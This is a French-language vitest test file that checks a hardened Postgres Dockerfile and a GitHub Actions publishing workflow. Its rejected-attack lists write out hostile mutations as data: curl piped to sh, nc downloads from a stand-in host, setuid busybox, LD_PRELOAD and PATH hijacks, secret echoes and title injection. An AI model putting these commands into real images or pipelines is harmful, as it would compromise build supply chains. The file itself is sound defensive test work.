import { createHash } from "node:crypto";
import { existsSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { load } from "js-yaml";
import { describe, expect, it } from "vitest";
import { genererIndex, lireDepot } from "./adr-index.js";

// Images dérivées temporaires (ADR 0014). Les fichiers sont lus par de vrais analyseurs : Dockerfile instruction par instruction, YAML par js-yaml.

const lire = (chemin: string) => readFileSync(fileURLToPath(new URL(`../${chemin}`, import.meta.url)), "utf8");
const DOCKERFILE = "ops/images/postgres-derivee/Dockerfile";
const WORKFLOW = ".github/workflows/images-derivees.yml";
const AMONT = "postgres:16.15-alpine@sha256:f4610795587492cd4fb887c2dc3de301b813278bb6f616992061141b5f15ac36";
const TRIVY = "ghcr.io/aquasecurity/trivy@sha256:665030f4d33a82c1e8d9d5e0453365842236723c1ee5cc3becca698268e66a56";
const CONDITION_PUBLIER = "github.event_name != 'pull_request' && github.ref == 'refs/heads/main'";
const IMAGE = "ghcr.io/will383842/axion-automatisations-clients/postgres-derivee";

type Obj = Record<string, unknown>;
const estObj = (v: unknown): v is Obj => typeof v === "object" && v !== null && !Array.isArray(v);
const copie = <T>(v: T): T => JSON.parse(JSON.stringify(v)) as T;

interface Instruction {
  cmd: string;
  arg: string;
}
function instructions(texte: string): Instruction[] {
  const sortie: Instruction[] = [];
  let courante = "";
  for (const brute of texte.split("\n")) {
    const l = brute.trim();
    if (l.startsWith("#")) continue;
    if (l.endsWith("\\")) {
      courante += `${l.slice(0, -1)} `;
      continue;
    }
    const complete = `${courante}${l}`.trim();
    courante = "";
    if (!complete) continue;
    const [cmd = "", ...reste] = complete.split(/\s+/);
    sortie.push({ cmd: cmd.toUpperCase(), arg: reste.join(" ") });
  }
  return sortie;
}

function analyserDockerfile(texte: string): string[] {
  const erreurs: string[] = [];
  const liste = instructions(texte);
  if (texte.split("\n").some((l) => /^\s*#\s*[A-Za-z]+\s*=/.test(l))) erreurs.push("directive d'analyse (syntax, escape, check) interdite");
  const from = liste.filter((i) => i.cmd === "FROM");
  if (from.length !== 1) erreurs.push("un seul FROM exigé");
  if (from[0]?.arg !== AMONT) erreurs.push("FROM différent de l'amont épinglé par empreinte");
  const suppression = liste.filter((i) => i.cmd === "RUN" && /^rm\s/.test(i.arg));
  const jetons = suppression.flatMap((i) => i.arg.split(/\s+/).slice(1));
  if (jetons.some((j) => j.startsWith("-")) || !jetons.includes("/usr/local/bin/gosu") || !jetons.includes("/usr/local/bin/su-exec")) erreurs.push("rm sans option qui retire gosu et su-exec exigé");
  for (const i of liste) {
    if (!suppression.includes(i) && /gosu|su-exec/.test(i.arg)) erreurs.push(`${i.cmd} : gosu ou su-exec réapparaît`);
    if (["ADD", "COPY", "ENTRYPOINT", "CMD", "VOLUME", "ONBUILD"].includes(i.cmd)) erreurs.push(`${i.cmd} interdit`);
    if (/\b(curl|wget|apk|apt|apt-get|pip)\b|\|\s*(ba)?sh/.test(i.arg)) erreurs.push(`${i.cmd} : téléchargement ou installation interdits`);
    if ((i.cmd === "ARG" || i.cmd === "ENV") && /TOKEN|KEY|SECRET|PASSWORD/i.test(i.arg.split(/[=\s]/)[0] ?? "")) erreurs.push(`${i.cmd} : nom de secret`);
  }
  const attendu = [{ cmd: "FROM", arg: AMONT }, { cmd: "RUN", arg: "rm /usr/local/bin/gosu /usr/local/bin/su-exec" }, { cmd: "USER", arg: "postgres" }];
  if (JSON.stringify(liste) !== JSON.stringify(attendu)) erreurs.push("liste blanche exacte : FROM amont, RUN rm gosu su-exec, USER postgres, rien d'autre");
  const dernier = liste[liste.length - 1];
  if (dernier?.cmd !== "USER" || dernier.arg !== "postgres") erreurs.push("la dernière instruction doit être USER postgres");
  return erreurs;
}

const etapes = (job: unknown): Obj[] => (estObj(job) && Array.isArray(job.steps) ? job.steps.filter(estObj) : []);
const execute = (e: Obj) => (typeof e.run === "string" ? e.run : "");
const trouver = (job: unknown, motif: string) => etapes(job).findIndex((e) => execute(e).includes(motif));

function analyserWorkflow(doc: Obj): string[] {
  const erreurs: string[] = [];
  const texte = JSON.stringify(doc);
  const jobs = estObj(doc.jobs) ? doc.jobs : {};
  const on = doc.on ?? doc["true"];
  if (JSON.stringify(doc.permissions) !== JSON.stringify({ contents: "read" })) erreurs.push("permissions de tête : contents: read seulement");
  if (texte.includes("pull_request_target")) erreurs.push("pull_request_target interdit");
  if (estObj(on) && Object.keys(on).sort().join(",") !== "pull_request,push,schedule,workflow_dispatch") erreurs.push("déclencheurs exacts : pull_request, push, schedule, workflow_dispatch");
  if (!estObj(on) || !("pull_request" in on)) erreurs.push("construction attendue sur pull_request");
  if (/secrets\./.test(texte)) erreurs.push("secrets.* interdit");
  if (JSON.stringify(on) !== JSON.stringify(ON)) erreurs.push("déclencheurs figés : paths pull_request et push = images, workflow, évaluateur, .nvmrc, package.json ; push sur main seulement");
  const nomsJobs = Object.keys(jobs).sort().join(",");
  if (nomsJobs !== "construire,publier") erreurs.push(`jobs attendus : construire et publier (trouvé : ${nomsJobs})`);
  for (const [nom, job] of Object.entries(jobs)) {
    if (!estObj(job)) continue;
    const permissions = estObj(job.permissions) ? job.permissions : {};
    if (nom === "publier") {
      if (JSON.stringify(Object.entries(permissions).sort()) !== JSON.stringify([["attestations", "write"], ["contents", "read"], ["id-token", "write"], ["packages", "write"]])) erreurs.push("publier : permissions exactes attendues");
      if (job.if !== CONDITION_PUBLIER) erreurs.push("publier : ne doit tourner ni sur pull_request ni hors main");
      if (job.needs !== "construire") erreurs.push("publier : needs construire");
    } else if (Object.entries(permissions).some(([, v]) => v !== "read") || ["packages", "id-token", "attestations"].some((k) => k in permissions)) erreurs.push(`${nom} : aucune écriture`);
    for (const e of etapes(job)) {
      if ("if" in e || "continue-on-error" in e) erreurs.push(`${nom} : aucune étape ne peut être conditionnelle ni tolérée (if, continue-on-error)`);
      if (typeof e.uses === "string") {
        if (!/^[\w.-]+\/[\w./-]+@[0-9a-f]{40}$/.test(e.uses)) erreurs.push(`action non épinglée par SHA : ${e.uses}`);
        if (!/^actions\/(checkout|setup-node|attest-build-provenance)@/.test(e.uses)) erreurs.push(`action hors liste : ${e.uses}`);
        if (e.uses.startsWith("actions/checkout@") && !(estObj(e.with) && e.with["persist-credentials"] === false)) erreurs.push("checkout sans persist-credentials: false");
        if (e.uses.startsWith("actions/attest-build-provenance@") && nom !== "publier") erreurs.push("attestation hors publier");
      }
      const cmd = execute(e);
      if (nom !== "publier" && /docker\s+(push|login)|buildx|--push/.test(cmd)) erreurs.push(`${nom} : publication ou connexion interdites`);
      if (cmd.includes("aquasecurity/trivy") && !cmd.includes(TRIVY)) erreurs.push("Trivy : empreinte différente de garde-briques.yml");
      if (/docker\s+(build|run)/.test(cmd) && /--platform\s+(?!linux\/amd64)/.test(cmd)) erreurs.push("plateforme inattendue");
    }
  }
  const pub = jobs.publier;
  const [fumee, trivy, garde, pousser] = ["pg_isready", "aquasecurity/trivy", "releve-trivy.ts --garde", "docker push"].map((m) => trouver(pub, m));
  const attester = etapes(pub).findIndex((e) => typeof e.uses === "string" && e.uses.startsWith("actions/attest-build-provenance@"));
  if ([fumee, trivy, garde, pousser, attester].some((n) => n < 0)) erreurs.push("publier : test de fumée, Trivy, évaluateur, push et attestation exigés");
  else if (!(fumee < trivy && trivy < garde && garde < pousser && pousser < attester)) erreurs.push("publier : push seulement après fumée, Trivy et évaluateur, attestation après le push");
  const etapePush = etapes(pub)[pousser];
  const attestation = etapes(pub)[attester];
  const id = etapePush?.id;
  if (typeof id !== "string" || !execute(etapePush ?? {}).includes("empreinte=") || !execute(etapePush ?? {}).includes("RepoDigests")) erreurs.push("push : l'empreinte doit être lue après le push");
  else if (!estObj(attestation?.with) || attestation.with["subject-digest"] !== `\${{ steps.${id}.outputs.empreinte }}` || attestation.with["subject-name"] !== IMAGE || attestation.with["push-to-registry"] !== true) erreurs.push("attestation : doit porter l'empreinte poussée");
  const construire = jobs.construire;
  if (trouver(construire, "releve-trivy.ts --garde") < 0 || trouver(construire, "aquasecurity/trivy") < 0 || trouver(construire, "pg_isready") < 0) erreurs.push("construire : fumée, Trivy et évaluateur exigés");
  return [...erreurs, ...analyserForme(jobs)];
}

const CHEMINS = ["ops/images/**", ".github/workflows/images-derivees.yml", "scripts/releve-trivy.ts", ".nvmrc", "package.json"];
const ON = { pull_request: { paths: CHEMINS }, push: { branches: ["main"], paths: CHEMINS }, schedule: [{ cron: "41 4 * * 1" }], workflow_dispatch: null };
const EVALUATEUR = "scripts/releve-trivy.ts";
const EMPREINTE_EVALUATEUR = "5139964208674ab07dfb3e96c2a7941985bddd739f571d5e199260ef52a27da9";
const sha = (texte: string) => createHash("sha256").update(texte).digest("hex");
// L'évaluateur décide seul si Trivy passe : son contenu est figé comme les blocs run.
const analyserEvaluateur = (texte: string): string[] => (sha(texte) === EMPREINTE_EVALUATEUR ? [] : ["releve-trivy.ts : empreinte différente de celle figée"]);

const empreinteRun = (e: Obj) => createHash("sha256").update(String(e.run).trim()).digest("hex");
const suite = (job: unknown) => etapes(job).map((e) => (typeof e.uses === "string" ? e.uses : empreinteRun(e)));
const CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1";
const SETUP_NODE = "actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1";
const ATTESTATION = "actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8";
const SUITE_DERIVEE = ["2cc82b403c67a4e486037fa8bca9d916b741363c20a1d849a3f7b53ca77beb75", "2b4e7f6c62e6037dcd3066d1bfdf04198fdb53ba15ad1155d64f01436d6fbf28", "141ad4b7e734456991654ae2e26f05ec4899efb2ad3828e0b77650ceec614614", "95587cf550dce1fbc69f7e8d88b456602526e53d79e7102cded09b33f724b58f"];
// Image du socle (D4) : construction, fumée, Trivy, évaluateur ; puis, dans publier seulement, push et attestation.
const SUITE_SOCLE = ["668bc1cd1c3f9cf87bbb799911b0839c3d0addfe804d840d4979b978a47ed6c7", "9139d805fe20a8cd38599f90af5d787089a60055efbd99dbed6071e9638f4bab", "cecf1891da06cd0c97652db0656ef7b12e5e75df0f9988ed986e9b7f89e4273a", "4af8f781253d648981d1bb01f72cb2b67a77173a1b94abecf84918847d6679b4"];
const SUITE_CONSTRUIRE = [CHECKOUT, SETUP_NODE, ...SUITE_DERIVEE, ...SUITE_SOCLE];
const SUITE_PUBLIER = [CHECKOUT, SETUP_NODE, ...SUITE_DERIVEE, "89dd0a51528b351200f20dee084db620976d939f9eda0c815e52b9fba10202bd", ATTESTATION, ...SUITE_SOCLE, "9904653be6709787daf7d81edc6b9784cace85d9cf5daf19fa02541d3c5a1099", ATTESTATION];

function analyserForme(jobs: Obj): string[] {
  const erreurs: string[] = [];
  if (JSON.stringify(suite(jobs.construire)) !== JSON.stringify(SUITE_CONSTRUIRE)) erreurs.push("construire : suite exacte des étapes attendue");
  if (JSON.stringify(suite(jobs.publier)) !== JSON.stringify(SUITE_PUBLIER)) erreurs.push("publier : suite exacte des étapes attendue (aucune étape ajoutée, retirée ni modifiée)");
  for (const [nom, job] of [["construire", jobs.construire], ["publier", jobs.publier]] as const) {
    for (const e of etapes(job)) {
      if (Object.keys(e).some((k) => !["name", "id", "uses", "with", "run", "env"].includes(k))) erreurs.push(`${nom} : clé d'étape inattendue`);
      if ("env" in e && !((e.id === "pousser" || e.id === "pousser-socle") && JSON.stringify(e.env) === JSON.stringify({ GITHUB_TOKEN: "${{ github.token }}" }))) erreurs.push(`${nom} : env d'étape réservé au push (GITHUB_TOKEN)`);
    }
  }
  const clefs = (j: unknown) => (estObj(j) ? Object.keys(j).sort().join(",") : "");
  if (clefs(jobs.publier) !== "if,name,needs,permissions,runs-on,steps") erreurs.push("publier : clés exactes if, name, needs, permissions, runs-on, steps (ni env ni timeout-minutes)");
  if (clefs(jobs.construire) !== "name,permissions,runs-on,steps") erreurs.push("construire : clés exactes name, permissions, runs-on, steps");
  return erreurs;
}

const reel = () => load(lire(WORKFLOW)) as Obj;

describe("images dérivées : Dockerfile postgres", () => {
  it("[A-381] image dérivée postgres : un seul FROM, égal à l'amont épinglé par empreinte", () => {
    const from = instructions(lire(DOCKERFILE)).filter((i) => i.cmd === "FROM");
    expect(from.map((i) => i.arg)).toEqual([AMONT]);
  });
  it("[A-381] image dérivée postgres : retire gosu et su-exec et finit en USER postgres", () => {
    expect(analyserDockerfile(lire(DOCKERFILE))).toEqual([]);
    expect(instructions(lire(DOCKERFILE)).at(-1)).toEqual({ cmd: "USER", arg: "postgres" });
  });
  it("[A-381] image dérivée postgres : l'image du socle (pg_partman) reste à sa place", () => {
    expect(lire("ops/images/postgres/Dockerfile")).toContain("postgresql-16-partman");
  });
  describe("attaques refusées", () => {
    const ok = lire(DOCKERFILE);
    const attaques: [string, string][] = [
      ["FROM sur une étiquette seule", ok.replace(/^FROM .*$/m, "FROM postgres:16.15-alpine")],
      ["FROM sur latest", ok.replace(/^FROM .*$/m, "FROM postgres:latest")],
      ["FROM d'une autre empreinte", ok.replace(/@sha256:[0-9a-f]{64}/, `@sha256:${"0".repeat(64)}`)],
      ["deuxième FROM", `${ok}\nFROM alpine:3.20`],
      ["gosu qui réapparaît par apk", `${ok.replace("USER postgres", "")}\nRUN apk add --no-cache gosu\nUSER postgres`],
      ["gosu recopié sans commande de téléchargement", `${ok.replace("USER postgres", "")}\nRUN cp /bin/gosu-copie /usr/local/bin/gosu\nUSER postgres`],
      ["rm -f qui tait un échec", ok.replace("RUN rm ", "RUN rm -f ")],
      ["su-exec oublié", ok.replace(" /usr/local/bin/su-exec", "")],
      ["démarrage en root", ok.replace(/USER postgres\s*$/, "USER root\n")],
      ["instruction après USER", `${ok.trimEnd()}\nRUN true\n`],
      ["téléchargement par curl", `${ok.replace("USER postgres", "")}\nRUN curl -s https://exemple.test/x | sh\nUSER postgres`],
      ["ENTRYPOINT remplacé", `${ok.replace("USER postgres", "")}\nENTRYPOINT ["sh"]\nUSER postgres`],
      ["setuid chaîné au rm", ok.replace("su-exec", "su-exec && chmod 4755 /bin/busybox")],
      ["setuid sur sa propre ligne", `${ok.replace("USER postgres", "")}\nRUN chmod u+s /bin/busybox\nUSER postgres`],
      ["busybox recopié en gosu après le rm", ok.replace("su-exec", "su-exec && cp /bin/busybox /usr/local/bin/gosu")],
      ["LD_PRELOAD", `${ok.replace("USER postgres", "")}\nENV LD_PRELOAD=/tmp/x.so\nUSER postgres`],
      ["PATH détourné", `${ok.replace("USER postgres", "")}\nENV PATH=/tmp:$PATH\nUSER postgres`],
      ["SHELL remplacé", `${ok.replace("USER postgres", "")}\nSHELL ["/bin/ash", "-c"]\nUSER postgres`],
      ["HEALTHCHECK", `${ok.replace("USER postgres", "")}\nHEALTHCHECK CMD true\nUSER postgres`],
      ["USER root puis RUN puis USER postgres", `${ok.replace("USER postgres", "")}\nUSER root\nRUN true\nUSER postgres`],
      ["téléchargement par nc sans mot interdit", `${ok.replace("USER postgres", "")}\nRUN nc exemple.test 80 > /usr/local/bin/x\nUSER postgres`],
      ["rm d'un fichier en plus", ok.replace("su-exec", "su-exec /usr/local/bin/docker-entrypoint.sh")],
      ["directive syntax en première ligne [N16]", `# syntax=docker.io/exemple/frontend:latest\n${ok}`],
      ["directive syntax à la place du commentaire [N16b]", ok.replace(/^#.*$/m, "# syntax=docker.io/exemple/frontend:latest")],
      ["directive escape en tête [N17]", `# escape=\`\n${ok}`],
      ["directive check avec espaces", `#  check = skip=all\n${ok}`],
      ["ARG nommé comme un secret", `${ok.replace("USER postgres", "")}\nARG TOKEN_DEPOT\nUSER postgres`],
    ];
    it.each(attaques)("[A-381] Dockerfile refusé : %s", (_nom, texte) => {
      expect(analyserDockerfile(texte)).not.toEqual([]);
    });
  });
});

describe("images dérivées : workflow", () => {
  it("[A-381] images-derivees.yml : permissions de tête contents: read ; packages: write, id-token: write et attestations: write seulement dans le job publier, qui ne tourne pas sur pull_request", () => {
    const doc = reel();
    expect(doc.permissions).toEqual({ contents: "read" });
    const jobs = doc.jobs as Obj;
    expect(Object.keys(jobs).sort()).toEqual(["construire", "publier"]);
    expect((jobs.construire as Obj).permissions).toEqual({ contents: "read" });
    expect((jobs.publier as Obj).permissions).toEqual({ contents: "read", packages: "write", "id-token": "write", attestations: "write" });
    expect(String((jobs.publier as Obj).if)).toContain("github.event_name != 'pull_request'");
    expect(String((jobs.publier as Obj).if)).toContain("github.ref == 'refs/heads/main'");
    expect(analyserWorkflow(doc)).toEqual([]);
  });
  it("[A-381] images-derivees.yml : toutes les actions sont épinglées par SHA de 40 signes, aucune action docker tierce, aucun secrets.*", () => {
    const doc = reel();
    const actions = Object.values(doc.jobs as Obj).flatMap(etapes).flatMap((e) => (typeof e.uses === "string" ? [e.uses] : []));
    expect(actions.length).toBeGreaterThan(0);
    for (const a of actions) expect(a).toMatch(/^actions\/(checkout|setup-node|attest-build-provenance)@[0-9a-f]{40}$/);
    expect(actions.some((a) => a.startsWith("docker/"))).toBe(false);
    expect(JSON.stringify(doc)).not.toMatch(/secrets\./);
  });
  it("[A-381] images-derivees.yml : le même évaluateur (releve-trivy --garde, seuils 7 et 30 jours) et la même empreinte Trivy que garde-briques.yml", () => {
    const doc = reel();
    const commandes = Object.values(doc.jobs as Obj).flatMap(etapes).map(execute).join("\n");
    expect(commandes).toContain(TRIVY);
    expect(commandes).toContain("node scripts/releve-trivy.ts --garde");
    // La garde des briques ne scanne pas encore (R3) : la comparaison vaut dès que son workflow lance Trivy.
    const gardeBriques = existsSync(fileURLToPath(new URL("../.github/workflows/garde-briques.yml", import.meta.url))) ? lire(".github/workflows/garde-briques.yml") : "";
    if (gardeBriques.includes("aquasecurity/trivy")) expect(gardeBriques).toContain(TRIVY);
    expect(existsSync(fileURLToPath(new URL("../.trivyignore", import.meta.url)))).toBe(false);
    expect(commandes).not.toMatch(/ignore|skip-dirs|--severity|--ignore-unfixed/);
  });
  it("[A-381] images-derivees.yml : docker push n'arrive qu'après le test de fumée et Trivy, puis l'attestation porte l'empreinte poussée", () => {
    const publier = (reel().jobs as Obj).publier;
    const [fumee, trivy, garde, pousser] = ["pg_isready", "aquasecurity/trivy", "releve-trivy.ts --garde", "docker push"].map((m) => trouver(publier, m));
    expect(fumee).toBeGreaterThanOrEqual(0);
    expect(fumee).toBeLessThan(trivy ?? -1);
    expect(trivy).toBeLessThan(garde ?? -1);
    expect(garde).toBeLessThan(pousser ?? -1);
    const attester = etapes(publier).findIndex((e) => typeof e.uses === "string" && e.uses.startsWith("actions/attest-build-provenance@"));
    expect(attester).toBeGreaterThan(pousser ?? 99);
    const push = etapes(publier)[pousser ?? 0] ?? {};
    expect((etapes(publier)[attester]?.with as Obj)["subject-digest"]).toBe(`\${{ steps.${String(push.id)}.outputs.empreinte }}`);
  });
  it("[A-381] releve-trivy.ts : l'évaluateur est figé par empreinte sha256, et le workflow se lance quand il change", () => {
    expect(analyserEvaluateur(lire(EVALUATEUR))).toEqual([]);
    const on = reel().on as Obj;
    expect(on).toEqual(ON);
    for (const d of ["pull_request", "push"]) expect((on[d] as Obj).paths).toContain(EVALUATEUR);
  });
  it("[A-381] images-derivees.yml : deux docker push dans tout le fichier, un par image", () => {
    expect(lire(WORKFLOW).match(/docker push/g)?.length).toBe(2);
  });
  describe("attaques refusées", () => {
    const modif = (f: (d: Obj) => void) => {
      const d = copie(reel());
      f(d);
      return analyserWorkflow(d);
    };
    const job = (d: Obj, n: string) => (d.jobs as Obj)[n] as Obj;
    const pas = (d: Obj, n: string) => job(d, n).steps as Obj[];
    const attaques: [string, (d: Obj) => void][] = [
      ["publier sur pull_request", (d) => delete job(d, "publier").if],
      ["publier sur toute branche", (d) => (job(d, "publier").if = "github.event_name != 'pull_request'")],
      ["continue-on-error sur l'évaluateur", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "releve-trivy.ts --garde")]!["continue-on-error"] = true)],
      ["continue-on-error sur Trivy", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "aquasecurity/trivy")]!["continue-on-error"] = true)],
      ["continue-on-error sur la fumée", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "pg_isready")]!["continue-on-error"] = "${{ true }}")],
      ["continue-on-error sur le push", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "docker push")]!["continue-on-error"] = true)],
      ["if: false sur l'évaluateur", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "releve-trivy.ts --garde")]!.if = "false")],
      ["if sur la fumée de publier", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "pg_isready")]!.if = "false")],
      ["if sur l'évaluateur de construire", (d) => (etapes(job(d, "construire"))[trouver(job(d, "construire"), "releve-trivy.ts --garde")]!.if = "false")],
      ["if sur le push", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "docker push")]!.if = "always()")],
      ["condition de publier || true", (d) => (job(d, "publier").if = `${String(job(d, "publier").if)} || true`)],
      ["condition de publier ou pull_request", (d) => (job(d, "publier").if = `${String(job(d, "publier").if)} || github.event_name == 'pull_request'`)],
      ["condition de publier ou always()", (d) => (job(d, "publier").if = `always() || (${String(job(d, "publier").if)})`)],
      ["condition de publier sur toute branche", (d) => (job(d, "publier").if = `${String(job(d, "publier").if)} || startsWith(github.ref, 'refs/heads/')`)],
      ["workflow_run ajouté", (d) => ((d.on as Obj).workflow_run = { workflows: ["ci"] })],
      ["écriture de paquets dans construire", (d) => (job(d, "construire").permissions = { contents: "read", packages: "write" })],
      ["permissions de tête en écriture", (d) => (d.permissions = { contents: "write" })],
      ["jeton d'identité absent de publier", (d) => delete (job(d, "publier").permissions as Obj)["id-token"]],
      ["pull_request_target", (d) => (d.on = { pull_request_target: null })],
      ["action non épinglée", (d) => (etapes(job(d, "construire"))[0]!.uses = "actions/checkout@v4")],
      ["action épinglée par SHA court", (d) => (etapes(job(d, "construire"))[0]!.uses = "actions/checkout@3d3c42e")],
      ["action docker tierce", (d) => pas(d, "construire").push({ uses: `docker/build-push-action@${"a".repeat(40)}` })],
      ["secret", (d) => (etapes(job(d, "publier"))[0]!.run = "echo ${{ secrets.JETON }}")],
      ["checkout qui garde les identifiants", (d) => ((etapes(job(d, "construire"))[0]!.with as Obj)["persist-credentials"] = true)],
      ["push dans construire", (d) => pas(d, "construire").push({ run: "docker push local/x" })],
      ["Trivy d'une autre empreinte", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "aquasecurity/trivy")]!.run = "docker run trivy:latest image x")],
      ["attestation sur une autre empreinte", (d) => ((etapes(job(d, "publier"))[trouver(job(d, "publier"), "docker push") + 1]!.with as Obj)["subject-digest"] = "sha256:inventee")],
      ["attestation avant le push", (d) => { const s = pas(d, "publier"); const a = s.pop()!; s.splice(trouver(job(d, "publier"), "docker push"), 0, a); }],
      ["pnpm install, test et corepack entre le push et l'attestation [N1]", (d) => pas(d, "publier").splice(-1, 0, { run: "corepack enable" }, { run: "pnpm install --frozen-lockfile" }, { run: "pnpm test" })],
      ["env de job avec le jeton et pnpm install avant le push [N2]", (d) => { job(d, "publier").env = { GITHUB_TOKEN: "${{ github.token }}" }; pas(d, "publier").splice(trouver(job(d, "publier"), "docker push"), 0, { run: "pnpm install" }); }],
      ["script du socle avant le push [N3]", (d) => pas(d, "publier").splice(trouver(job(d, "publier"), "docker push"), 0, { run: "ops/socle/lancer.sh" })],
      ["bloc de construction recopié avant le push [N4]", (d) => { const s = pas(d, "publier"); s.splice(trouver(job(d, "publier"), "docker push"), 0, copie(s[2]!)); }],
      ["env de job dans publier [N15]", (d) => (job(d, "publier").env = { NODE_ENV: "${{ github.event.pull_request.title }}" })],
      ["env ajouté à l'étape de construction", (d) => (etapes(job(d, "publier"))[2]!.env = { LD_PRELOAD: "/tmp/x.so" })],
      ["env du push avec une clé en plus", (d) => ((etapes(job(d, "publier"))[trouver(job(d, "publier"), "docker push")]!.env as Obj).AUTRE = "x")],
      ["clé d'étape inattendue (shell)", (d) => (etapes(job(d, "publier"))[3]!.shell = "bash {0}")],
      ["timeout-minutes dans publier [N15]", (d) => (job(d, "publier")["timeout-minutes"] = 1)],
      ["étape ajoutée dans construire", (d) => pas(d, "construire").push({ run: "pnpm install" })],
      ["push avant Trivy", (d) => { const s = pas(d, "publier"); const t = s.splice(trouver(job(d, "publier"), "aquasecurity/trivy"), 1)[0]!; s.push(t); }],
    ];
    attaques.push(
      ["paths de pull_request sans l'évaluateur [E1]", (d) => ((d.on as Obj).pull_request = { paths: CHEMINS.filter((c) => c !== EVALUATEUR) })],
      ["paths de push sans l'évaluateur [E1]", (d) => (((d.on as Obj).push as Obj).paths = CHEMINS.filter((c) => c !== EVALUATEUR))],
      ["pull_request sans paths", (d) => ((d.on as Obj).pull_request = null)],
      ["push sur toute branche", (d) => (((d.on as Obj).push as Obj).branches = ["**"])],
      ["cron changé", (d) => ((d.on as Obj).schedule = [{ cron: "0 0 * * *" }])],
      ["chemin en trop dans paths", (d) => (((d.on as Obj).push as Obj).paths = [...CHEMINS, "docs/**"])],
    );
    it.each(attaques)("[A-381] workflow refusé : %s", (_nom, f) => {
      expect(modif(f)).not.toEqual([]);
    });
  });
});

describe("images dérivées : évaluateur figé", () => {
  const ok = lire(EVALUATEUR);
  const attaques: [string, string][] = [
    ["E1 : sortie toujours 0", ok.replace("process.exit(erreurs.length ? 1 : 0)", "process.exit(0)")],
    ["E2 : exception pour postgres-derivee", ok.replace("export function evaluer(rapport: unknown, image: string, maintenant: Date): string[] {", 'export function evaluer(rapport: unknown, image: string, maintenant: Date): string[] {\n  if (image === "postgres-derivee") return [];')],
    ["seuil critique relevé", ok.replace("CRITICAL: 7", "CRITICAL: 70")],
    ["rapport illisible toléré", ok.replace("process.exit(1);\n  }\n  if (mode", "rapport = { Results: [] };\n  }\n  if (mode")],
    ["espace en trop", `${ok} `],
  ];
  it.each(attaques)("[A-381] evaluateur refusé : %s", (_nom, texte) => {
    expect(texte).not.toBe(ok);
    expect(analyserEvaluateur(texte)).not.toEqual([]);
  });
});

describe("images dérivées : documents", () => {
  it("[A-381] README des images, ADR 0014 et Dependabot docker existent", () => {
    expect(lire("ops/images/README.md")).toContain("postgres-derivee");
    expect(lire("docs/adr/0014-images-derivees.md")).toContain("Trivy");
    expect(genererIndex(lireDepot(fileURLToPath(new URL("..", import.meta.url))).adrs)).toContain("| 0014 |");
    const dependabot = load(lire(".github/dependabot.yml")) as { updates: { "package-ecosystem": string; directory: string }[] };
    expect(dependabot.updates.filter((u) => u["package-ecosystem"] === "docker").map((u) => u.directory)).toEqual(["/ops/images/postgres-derivee"]);
  });
});
